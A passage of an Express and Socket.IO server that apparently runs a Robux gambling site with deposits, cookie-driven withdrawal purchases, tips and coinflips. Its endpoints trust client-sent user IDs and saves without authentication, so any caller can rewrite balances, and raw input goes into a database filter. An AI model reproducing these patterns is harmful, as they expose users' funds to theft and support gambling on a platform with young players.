    const seen = new Set();
    const out = [];
    for (const e of merged) {
        const k = String(e.id != null ? e.id : `${e.username}|${e.gameKey}|${e.createdAt}|${e.payout}`);
        if (seen.has(k)) continue;
        seen.add(k);
        out.push(e);
        if (out.length >= limit) break;
    }
    res.json({ events: out });
});

app.post('/api/live-feed', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const ip = req.ip || req.socket.remoteAddress || 'unknown';
    if (!liveFeedCheckRateLimit(ip)) {
        return res.status(429).json({ error: 'Too many feed updates. Slow down.' });
    }
    const body = req.body || {};
    const gameKey = String(body.gameKey || '')
        .toLowerCase()
        .replace(/[^a-z]/g, '');
    if (!LIVE_FEED_GAME_KEYS.has(gameKey)) {
        return res.status(400).json({ error: 'invalid gameKey' });
    }
    const username = sanitizeLiveFeedUsername(body.username);
    const bet = num(body.bet, 0);
    const multiplier = num(body.multiplier, 0);
    const payout = num(body.payout, 0);
    if (bet < 0 || bet > 1e9 || multiplier < 0 || multiplier > 1e6 || payout < -1e9 || payout > 1e9) {
        return res.status(400).json({ error: 'invalid amounts' });
    }
    const ev = {
        id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
        username,
        gameKey,
        bet,
        multiplier,
        payout,
        createdAt: Date.now()
    };
    let persisted = false;
    try {
        persisted = await liveFeedInsertSupabase(ev);
    } catch (e) {
        persisted = false;
    }
    if (!persisted) liveFeedMemoryPush(ev);
    res.json({ ok: true });
});

app.options('/api/account-sync', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);
});

app.get('/api/account-sync', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const id = parseInt(String(req.query.userId || ''), 10);
    if (!id) return res.status(400).json({ error: 'missing userId' });
    if (!supabaseEnabled()) {
        return res.status(503).json({ error: 'Account storage is not configured or unavailable.' });
    }
    try {
        const save = await loadAccountFromSupabase(id);
        if (!save) {
            return res.status(404).json({ error: 'no account' });
        }
        res.setHeader('Content-Type', 'application/json');
        res.status(200).send(JSON.stringify(save));
    } catch (e) {
        console.error('GET /api/account-sync:', e);
        res.status(503).json({ error: 'Could not load account data. Try again later.' });
    }
});

app.post('/api/account-sync', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const body = req.body || {};
    const userId = parseInt(String(body.userId != null ? body.userId : ''), 10);
    const save = body.save;
    if (!userId || !save || typeof save !== 'object') {
        return res.status(400).json({ error: 'expected { userId, save }' });
    }
    if (save.robloxUserId !== userId) {
        return res.status(400).json({ error: 'robloxUserId mismatch' });
    }
    mergeFlipIntoBalance(save);
    save.savedAt = Date.now();
    if (typeof save.balanceZh !== 'number' || save.balanceZh < 0) {
        save.balanceZh = 0;
    }
    if (!supabaseEnabled()) {
        return res.status(503).json({ error: 'Account storage is not configured or unavailable.' });
    }
    try {
        const result = await persistAccountSave(userId, save);
        if (!result.ok) {
            return res.status(503).json({
                error: 'Could not save account. Storage may be unavailable.',
                step: result.step,
                detail: result.detail
            });
        }
        res.json({ ok: true });
    } catch (e) {
        console.error('POST /api/account-sync:', e);
        res.status(503).json({ error: 'write failed', detail: String(e && e.message) });
    }
});

app.get('/api/roblox-headshot', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const id = parseInt(String(req.query.userId || ''), 10);
    if (!id) return res.status(400).json({ error: 'missing userId' });
    const avatarUrl = await fetchRobloxAvatarHeadshotUrl(id);
    if (!avatarUrl) return res.status(404).json({ error: 'no avatar' });
    res.json({ avatarUrl });
});

app.options('/api/roblox-lookup', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);
});

app.post('/api/roblox-lookup', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const username = req.body && req.body.username;
    const result = await lookupRobloxUsername(username);
    if (!result.ok) {
        res.status(result.status).json(result.body);
        return;
    }
    const avatarUrl = await fetchRobloxAvatarHeadshotUrl(result.body.id);
    const body = { ...result.body };
    if (avatarUrl) body.avatarUrl = avatarUrl;
    res.status(200).json(body);
});

app.options('/api/roblox-verify', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);
});

app.post('/api/roblox-verify', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const body = req.body || {};
    const userId = parseInt(String(body.userId != null ? body.userId : ''), 10);
    const code = typeof body.code === 'string' ? body.code.trim().toUpperCase() : '';
    if (!userId || userId < 1) {
        return res.status(400).json({ error: 'missing userId' });
    }
    if (!isValidVerificationCode(code)) {
        return res.status(400).json({ error: 'invalid code format' });
    }
    const description = await fetchRobloxUserDescription(userId);
    if (description === null) {
        return res.status(502).json({ error: 'Could not read Roblox profile' });
    }
    const bio = description.toLowerCase();
    const needle = code.toLowerCase();
    if (!bio.includes(needle)) {
        return res.status(400).json({
            error:
                'Verification code not found in your profile About section. Add the exact code, save, wait a few seconds, then try again.'
        });
    }
    res.json({ ok: true });
});

/** Game pass deposit: Robux paid = ZR$ credited. Keys must match client GAME_PASS_DEPOSIT_TIERS. */
const GAME_PASS_CREDIT_BY_ID = {
    1784194501: 7,
    1783449405: 8,
    1784128758: 9,
    1784222735: 10,
    1784188882: 15,
    1784300749: 20,
    1784700043: 25,
    1784130820: 30,
    1784396767: 35,
    1784082914: 40,
    1783926960: 45,
    1784340755: 50,
    1784248824: 60,
    1783479386: 70,
    1784464672: 80,
    1784464674: 90,
    1783918985: 100
};

/**
 * Per-user, per-gamepass cooldown.
 * After a successful deposit, the specific gamepass is locked for DEPOSIT_LOCK_MS
 * to prevent spam-clicking.  After the timer expires the lock is cleared,
 * so the user can delete the pass from their Roblox inventory, buy it fresh,
 * and deposit again.
 *
 * Structure:  Map<userId, Set<gamePassId>>
 */
const DEPOSIT_LOCK_MS = 5000;
const depositLocks = new Map();

function isDepositLocked(userId, gamePassId) {
    const s = depositLocks.get(userId);
    return s ? s.has(gamePassId) : false;
}

function lockDeposit(userId, gamePassId) {
    if (!depositLocks.has(userId)) depositLocks.set(userId, new Set());
    depositLocks.get(userId).add(gamePassId);
    setTimeout(() => {
        const s = depositLocks.get(userId);
        if (s) {
            s.delete(gamePassId);
            if (s.size === 0) depositLocks.delete(userId);
        }
    }, DEPOSIT_LOCK_MS);
}

function fetchUserOwnsGamePass(userId, gamePassId) {
    return new Promise((resolve) => {
        const p = `/v1/users/${encodeURIComponent(userId)}/items/GamePass/${encodeURIComponent(gamePassId)}/is-owned`;
        https
            .get({ hostname: 'inventory.roblox.com', port: 443, path: p }, (robRes) => {
                const chunks = [];
                robRes.on('data', (c) => chunks.push(c));
                robRes.on('end', () => {
                    const raw = Buffer.concat(chunks).toString();
                    if (robRes.statusCode !== 200) {
                        console.error(`[Deposit] Roblox is-owned ${robRes.statusCode} for user=${userId} gp=${gamePassId}: ${raw}`);
                        resolve({ ok: false, status: robRes.statusCode, raw });
                        return;
                    }
                    try {
                        const owned = JSON.parse(raw);
                        resolve({ ok: true, owned: owned === true });
                    } catch (e) {
                        resolve({ ok: false, status: 502, raw });
                    }
                });
            })
            .on('error', (err) => {
                console.error(`[Deposit] Roblox is-owned network error for user=${userId} gp=${gamePassId}:`, err.message);
                resolve({ ok: false, status: 502, raw: null });
            });
    });
}

app.options('/api/gamepass-deposit-claim', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);
});

app.post('/api/gamepass-deposit-claim', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const body = req.body || {};
    const userId = parseInt(String(body.userId != null ? body.userId : ''), 10);

    if (!userId || userId < 1) {
        return res.status(400).json({ error: 'Missing userId.' });
    }

    // ── Validate gamepass ID ──
    const gamePassId = parseInt(String(body.gamePassId != null ? body.gamePassId : ''), 10);
    if (!gamePassId || gamePassId < 1) {
        return res.status(400).json({ error: 'Missing or invalid gamePassId.' });
    }
    const credit = GAME_PASS_CREDIT_BY_ID[gamePassId];
    if (typeof credit !== 'number' || credit < 1) {
        return res.status(400).json({ error: 'That game pass is not enabled for deposits.' });
    }

    // ── Per-gamepass cooldown (prevents spam-clicking the same tier) ──
    if (isDepositLocked(userId, gamePassId)) {
        return res.status(429).json({
            error: 'You just deposited this tier. Wait a few seconds before trying again.'
        });
    }

    if (!supabaseEnabled()) {
        return res.status(503).json({ error: 'Account storage is not configured or unavailable.' });
    }

    // ── Ask Roblox: does this user actually own this game pass right now? ──
    const own = await fetchUserOwnsGamePass(userId, gamePassId);
    if (!own.ok) {
        return res.status(502).json({
            error: 'Could not verify ownership with Roblox. Try again in a moment.'
        });
    }
    if (!own.owned) {
        return res.status(400).json({
            error: 'You do not own this game pass. Buy it on Roblox first, then come back and click Verify.'
        });
    }

    // ── Ownership verified — load balance from Supabase, credit, save ──
    const diskSave = await readAccountJson(userId);
    const save = diskSave ? { ...diskSave } : { robloxUserId: userId, balance: 0, stats: {} };
    save.robloxUserId = userId;
    mergeFlipIntoBalance(save);
    if (!save.stats || typeof save.stats !== 'object') save.stats = {};
    if (!Array.isArray(save.stats.depositedPassIds)) save.stats.depositedPassIds = [];

    // Check if this specific gamepass ID has already been credited to this user account
    if (save.stats.depositedPassIds.includes(gamePassId)) {
        return res.status(400).json({ error: 'This game pass has already been used for a deposit. Buy a different tier or wait for new ones.' });
    }

    const bal = typeof save.balance === 'number' && save.balance >= 0 ? save.balance : 0;
    save.balance = bal + credit;
    save.stats.deposited = (typeof save.stats.deposited === 'number' ? save.stats.deposited : 0) + credit;
    save.stats.depositedPassIds.push(gamePassId);
    save.savedAt = Date.now();

    if (!Array.isArray(save.transactions)) save.transactions = [];
    save.transactions.unshift({
        id: Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, '0'),
        desc: `Deposit (Game Pass ${credit} R$)`,
        date: formatTxDateServer(),
        amount: credit,
        type: 'deposit'
    });
    if (save.transactions.length > 100) save.transactions = save.transactions.slice(0, 100);

    try {
        const result = await persistAccountSave(userId, save);
        if (!result.ok) {
            return res.status(503).json({ error: 'Could not save account.', step: result.step, detail: result.detail });
        }
    } catch (e) {
        console.error('[Deposit] persist error:', e);
        return res.status(503).json({ error: 'Could not save account.', detail: String(e && e.message) });
    }

    // ── Lock this tier for 5 seconds so they can't spam-click ──
    lockDeposit(userId, gamePassId);

    console.log(`[Deposit] user=${userId} gp=${gamePassId} credited=${credit} newBal=${save.balance}`);
    res.json({ ok: true, save, credited: credit });
});

/**
 * Active Scanner: Checks Roblox for ownership of any deposit gamepasses.
 * This is used to force the user to delete any gamepasses they own.
 */
app.post('/api/scan-owned-passes', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const body = req.body || {};
    const userId = parseInt(String(body.userId != null ? body.userId : ''), 10);

    if (!userId || userId < 1) {
        return res.status(400).json({ error: 'Missing userId.' });
    }

    const gamePassIds = Object.keys(GAME_PASS_CREDIT_BY_ID).map(id => parseInt(id, 10));
    const ownedPasses = [];

    // Scan all passes concurrently (17 passes is small enough for Roblox API)
    const checks = gamePassIds.map(async (gpId) => {
        const own = await fetchUserOwnsGamePass(userId, gpId);
        if (own.ok && own.owned) {
            ownedPasses.push(gpId);
        }
    });

    await Promise.all(checks);

    res.json({ ok: true, ownedPasses });
});


// =====================================================================
// ROBLOX BOT — Automated Gamepass Withdrawal
// =====================================================================
/** The bot's .ROBLOSECURITY cookie from .env */
const ROBLOX_COOKIE = (process.env.ROBLOX_COOKIE || '').trim();

/** Set to true once noblox has authenticated successfully. */
let botReady = false;
let botUsername = 'NOT LOGGED IN';

async function initRobloxBot() {
    if (!ROBLOX_COOKIE) {
        console.warn('[Withdrawal Bot] ROBLOX_COOKIE not set in .env — withdrawal endpoint will be disabled.');
        return;
    }
    try {
        const user = await noblox.setCookie(ROBLOX_COOKIE);
        // noblox.js v4+ returns { name, id } — older versions used UserName/UserID
        botUsername = user.name || user.UserName || JSON.stringify(user);
        const botId   = user.id   || user.UserID;
        botReady = true;
        console.log(`[Withdrawal Bot] Logged in as ${botUsername} (ID: ${botId})`);
    } catch (e) {
        console.error('[Withdrawal Bot] Login failed:', e && e.message);
    }
}
initRobloxBot();

/**
 * POST /api/withdraw
 * Body: { userId: number, gamepassId: string, zrCoins: number, expectedRobux: number }
 *
 * Flow:
 *   1. Validate inputs & bot readiness.
 *   2. Fetch product info for the gamepass (verifies it exists & gets price).
 *   3. Verify the gamepass is owned by the requesting Roblox user.
 *   4. Purchase the gamepass with the bot account.
 *   5. Deduct ZR$ from the user's Supabase balance.
 */
app.post('/api/withdraw', express.json(), async (req, res) => {
    if (!botReady) {
        return res.status(503).json({ error: 'Withdrawal bot is offline. Make sure ROBLOX_COOKIE is set in .env and restart the server.' });
    }

    const { userId, gamepassId, zrCoins, expectedRobux } = req.body || {};

    if (!userId || !gamepassId || !zrCoins || zrCoins <= 0) {
        return res.status(400).json({ error: 'Missing or invalid fields: userId, gamepassId, zrCoins are required.' });
    }
    if (!supabaseEnabled()) {
        return res.status(503).json({ error: 'Server database is not configured. Contact admin.' });
    }

    const gpId = parseInt(String(gamepassId).replace(/\D/g, ''), 10);
    if (!gpId || isNaN(gpId)) {
        return res.status(400).json({ error: 'Invalid gamepass ID extracted from the link.' });
    }

    const diskSave = await readAccountJson(userId);
    let save = diskSave ? { ...diskSave } : { balance: 0, balanceZh: 0, stats: {} };
    if (!save.stats) save.stats = {};

    const lastWd = save.stats.lastWithdrawAt || 0;
    const cooldownMs = 30 * 60 * 1000;
    if (Date.now() - lastWd < cooldownMs) {
        const leftMin = Math.ceil((cooldownMs - (Date.now() - lastWd)) / 60000);
        return res.status(429).json({ error: `Withdraw on cooldown. Please wait ${leftMin} more minute(s).` });
    }

    // --- Step 1: Get gamepass product info from Roblox ---
    let productInfo;
    try {
        productInfo = await noblox.getGamePassProductInfo(gpId);
    } catch (e) {
        console.error('[Withdraw] getGamePassProductInfo failed:', e && e.message);
        return res.status(400).json({ error: 'Could not find that gamepass on Roblox. Make sure it is published and the link is correct.' });
    }

    const gamepassPrice = productInfo && productInfo.PriceInRobux;
    if (typeof gamepassPrice !== 'number' || gamepassPrice <= 0) {
        return res.status(400).json({ error: 'This gamepass has no price set. Please set its price on Roblox first.' });
    }

    // Validate price is within 5% tolerance of what the client expected
    const priceOk = Math.abs(gamepassPrice - expectedRobux) <= Math.ceil(expectedRobux * 0.05) + 1;
    if (!priceOk) {
        return res.status(400).json({
            error: `Gamepass price mismatch. Expected ~${expectedRobux} R$ but found ${gamepassPrice} R$. Update the gamepass price to ${expectedRobux} R$ on Roblox and try again.`
        });
    }

    const afterTax = Math.floor(gamepassPrice * 0.7);
    if (gamepassPrice > 150) {
        return res.status(400).json({ error: `Maximum withdrawal limit is 150 R$ per transaction. Your request is ${gamepassPrice} R$.` });
    }

    // --- Step 2: Verify the gamepass belongs to the requesting user ---
    let creatorId;
    try {
        creatorId = productInfo.Creator && productInfo.Creator.Id;
    } catch (_) {}

    if (!creatorId || String(creatorId) !== String(userId)) {
        return res.status(403).json({ error: 'This gamepass does not belong to your Roblox account. Please create the gamepass from YOUR account.' });
    }

    // --- Step 3: Check our balance in Supabase before touching Roblox ---
    const currentBal = await getUserBalance(userId);
    if (!currentBal) {
        return res.status(503).json({ error: 'Could not read your account balance. Try again.' });
    }
    if (currentBal.balance_zr < zrCoins) {
        return res.status(400).json({ error: 'Insufficient ZR$ balance on server.' });
    }

    // --- Step 4: Purchase the gamepass with the bot using custom fetch (noblox v9 removed native buy wrapper) ---
    try {
        const csrfToken = await noblox.getGeneralToken();
        const cookie = `.ROBLOSECURITY=${process.env.ROBLOX_COOKIE.trim().replace(/^"|"$/g, '')}`;

        const purchaseRes = await fetch(`https://economy.roblox.com/v1/purchases/products/${productInfo.ProductId}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
                'Cookie': cookie
            },
            body: JSON.stringify({
                expectedCurrency: 1,
                expectedPrice: gamepassPrice,
                expectedSellerId: creatorId
            })
        });

        const purchaseJson = await purchaseRes.json();
        
        if (!purchaseRes.ok || !purchaseJson.purchased) {
            throw new Error(purchaseJson.errorMsg || purchaseJson.message || 'Roblox rejected the transaction API call.');
        }

        console.log(`[Withdraw] Bot purchased Gamepass ${gpId} (Product: ${productInfo.ProductId}, Price: ${gamepassPrice} R$) for user ${userId}`);
    } catch (e) {
        const msg = e && e.message ? e.message : String(e);
        console.error('[Withdraw] Purchase failed:', msg);
        // Common noblox errors have useful messages — surface them to the user
        return res.status(400).json({ error: 'Bot could not purchase the gamepass: ' + msg });
    }

    // --- Step 5: Deduct the ZR$ balance in Supabase & Persist Profile ---
    const newZr = Math.max(0, currentBal.balance_zr - zrCoins);
    const updateResult = await updateUserBalance(userId, newZr, currentBal.balance_zh);
    
    // Update local profile JSON for stats/cooldown
    save.balance = newZr;
    save.stats.withdrawn = (save.stats.withdrawn || 0) + zrCoins;
    save.stats.lastWithdrawAt = Date.now();
    if (!Array.isArray(save.transactions)) save.transactions = [];
    save.transactions.unshift({
        id: Math.floor(Math.random() * 0xffffffff).toString(16).padStart(8, '0'),
        desc: `Withdrawal (${Math.floor(gamepassPrice * 0.7)} R$ received)`,
        date: formatTxDateServer(),
        amount: -zrCoins,
        type: 'withdraw'
    });
    if (save.transactions.length > 100) save.transactions = save.transactions.slice(0, 100);
    
    await persistAccountSave(userId, save);

    if (!updateResult.ok) {
        console.error('[Withdraw] CRITICAL: Gamepass bought but balance update failed!', updateResult);
    }

    return res.json({
        ok: true,
        message: `Gamepass purchased successfully. You will receive ${Math.floor(gamepassPrice * 0.7)} R$ in your pending balance after Roblox tax.`,
        robuxPaid: gamepassPrice,
        robuxAfterTax: Math.floor(gamepassPrice * 0.7)
    });
});
// =====================================================================
// REAL-TIME SOCIAL & PVP (SOCKET.IO)
// =====================================================================
/** In-memory state for active social events */
let chatHistory = [];
let activeRains = [];
let activeFlips = [];

io.on('connection', (socket) => {
    console.log(`[Socket] Client connected: ${socket.id}`);

    // Initial sync
    socket.emit('chat:history', chatHistory.slice(-50));
    socket.emit('rain:active', activeRains);
    socket.emit('coinflip:list', activeFlips);
    io.emit('online:count', io.engine.clientsCount);

    socket.on('chat:message', async (data) => {
        const { userId, username, message } = data;
        if (!message || message.trim().length === 0) return;

        const msgObj = {
            id: Math.random().toString(36).substr(2, 9),
            userId,
            username,
            text: message.substring(0, 200),
            createdAt: Date.now()
        };

        chatHistory.push(msgObj);
        if (chatHistory.length > 100) chatHistory.shift();
        io.emit('chat:message', msgObj);
    });

    // TIP SYSTEM SVR
    socket.on('tip:send', async ({ fromUserId, toTarget, amount }) => {
        if (!fromUserId || !toTarget || amount < 1) return;
        
        try {
            const senderSave = await readAccountJson(fromUserId);
            if (!senderSave || senderSave.balance < amount) {
                return socket.emit('notification', { type: 'error', text: 'Not enough balance for tip!' });
            }

            // Find recipient
            let recipientId = parseInt(toTarget);
            if (isNaN(recipientId)) {
                // Try to find by name in DB
                const res = await supabaseFetch(`transactions?type=eq.account_profile&game_name=ilike.*"${toTarget}"*`, { method: 'GET' });
                if (res && res.length > 0) {
                    for (const row of res) {
                        try {
                            const p = JSON.parse(row.game_name);
                            if (p && p.username && p.username.toLowerCase() === toTarget.toLowerCase()) {
                                recipientId = row.user_id;
                                break;
                            }
                        } catch(e) {}
                    }
                }
            }

            if (!recipientId || recipientId === fromUserId) {
                return socket.emit('notification', { type: 'error', text: 'Recipient not found!' });
            }

            const recSave = await readAccountJson(recipientId);
            if (!recSave) return socket.emit('notification', { type: 'error', text: 'Recipient wallet not initialized.' });

            // Atomic-ish transfer
            senderSave.balance -= amount;
            recSave.balance += amount;

            await persistAccountSave(fromUserId, senderSave);
            await persistAccountSave(recipientId, recSave);

            socket.emit('notification', { type: 'success', text: `Tipped ${amount} ZH$ to ${recSave.username}!` });
            socket.emit('balance:update', { balance: senderSave.balance });
            
            io.emit('chat:message', {
                username: 'System',
                text: `${senderSave.username} tipped ${amount} ZH$ to ${recSave.username}!`,
                createdAt: Date.now()
            });

        } catch (e) {
            console.error('[Tip Error]', e);
        }
    });

    // RAIN SYSTEM SVR
    socket.on('rain:create', async ({ userId, amount, duration, minWager }) => {
        if (amount < 10) return;
        
        try {
            const save = await readAccountJson(userId);
            if (!save || save.balance < amount) return;

            save.balance -= amount;
            await persistAccountSave(userId, save);
            socket.emit('balance:update', { balance: save.balance });

            const rain = {
                id: Math.random().toString(36).substr(2, 9),
                creator: save.username,
                amount,
                minWager: minWager || 0,
                endsAt: Date.now() + (duration * 1000),
                joiners: []
            };

            activeRains.push(rain);
            io.emit('rain:active', activeRains);
            io.emit('chat:message', {
                username: 'System',
                text: `${save.username} started a Rain for ${amount} ZH$!`,
                createdAt: Date.now()
            });

            setTimeout(async () => {
                // End Rain
                const idx = activeRains.findIndex(r => r.id === rain.id);
                if (idx === -1) return;
                const r = activeRains[idx];
                activeRains.splice(idx, 1);

                if (r.joiners.length === 0) {
                    save.balance += amount;
                    await persistAccountSave(userId, save);
                    io.emit('chat:message', { username: 'System', text: 'Rain ended with no joiners. Refunded.', createdAt: Date.now() });
                } else {
                    const share = Math.floor((r.amount / r.joiners.length) * 100) / 100;
                    for (const uid of r.joiners) {
                        const js = await readAccountJson(uid);
                        if (js) {
                            js.balance += share;
                            await persistAccountSave(uid, js);
                        }
                    }
                    io.emit('chat:message', { 
                        username: 'System', 
                        text: `🌧️ Rain ended! ${r.joiners.length} players split ${r.amount} ZH$ (${share} each).`,
                        createdAt: Date.now() 
                    });
                }
                io.emit('rain:active', activeRains);
            }, duration * 1000);

        } catch (e) {
            console.error('[Rain Error]', e);
        }
    });

    socket.on('rain:join', ({ rainId, userId }) => {
        const rain = activeRains.find(r => r.id === rainId);
        if (rain && !rain.joiners.includes(userId)) {
            rain.joiners.push(userId);
            socket.emit('rain:join-confirmed', { rainId });
        }
    });

    // COINFLIP SVR
    socket.on('coinflip:create', async ({ userId, amount }) => {
        if (amount < 1) return;
        
        // LIMIT: 1 active flip per player
        const hasActive = activeFlips.some(f => f.player1.userId === userId || (f.player2 && f.player2.userId === userId));
        if (hasActive) {
            return socket.emit('notification', { type: 'error', text: 'You already have an active coinflip!' });
        }

        try {
            const save = await readAccountJson(userId);
            if (!save || save.balance < amount) return;

            save.balance -= amount;
            await persistAccountSave(userId, save);
            socket.emit('balance:update', { balance: save.balance });
            socket.emit('coinflip:created'); // Confirm success to clear loading state

            const flip = {
                id: Math.random().toString(36).substr(2, 9),
                amount,
                player1: { userId, username: save.username, avatar: save.robloxAvatarUrl },
                player2: null,
                status: 'waiting',
                createdAt: Date.now()
            };

            activeFlips.push(flip);
            io.emit('coinflip:list', activeFlips);
        } catch (e) {}
    });

    socket.on('coinflip:join', async ({ flipId, userId }) => {
        const flip = activeFlips.find(f => f.id === flipId);
        if (!flip || flip.status !== 'waiting' || flip.player1.userId === userId) return;

        try {
            const save = await readAccountJson(userId);
            if (!save || save.balance < flip.amount) return;

            save.balance -= flip.amount;
            await persistAccountSave(userId, save);
            socket.emit('balance:update', { balance: save.balance });

            flip.player2 = { userId, username: save.username, avatar: save.robloxAvatarUrl };
            flip.status = 'playing';
            io.emit('coinflip:list', activeFlips);

            // Execute Flip
            setTimeout(async () => {
                const winnerIdx = Math.random() < 0.5 ? 1 : 2;
                const winner = winnerIdx === 1 ? flip.player1 : flip.player2;
                const totalPot = flip.amount * 2;
                const fee = Math.floor(totalPot * 0.05); // 5% fee
                const payout = totalPot - fee;

                const winSave = await readAccountJson(winner.userId);
                if (winSave) {
                    winSave.balance += payout;
                    await persistAccountSave(winner.userId, winSave);
                }

                io.emit('coinflip:results', { flipId: flip.id, winnerIdx, winner, payout });
                
                setTimeout(() => {
                    activeFlips = activeFlips.filter(f => f.id !== flipId);
                    io.emit('coinflip:list', activeFlips);
                }, 5000);
            }, 500);

        } catch (e) {}
    });

    socket.on('disconnect', () => {
        io.emit('online:count', io.engine.clientsCount);
        console.log(`[Socket] Client disconnected: ${socket.id}`);
    });
});

app.use(express.static(ROOT));

server.listen(PORT, () => {
    console.log(`Open http://localhost:${PORT}`);
    if (supabaseEnabled()) {
        console.log('Account data: Supabase (user_balances + transactions)');
    } else {
        console.log('Account data: Local JSON only (save/load endpoints available)');
    }
});
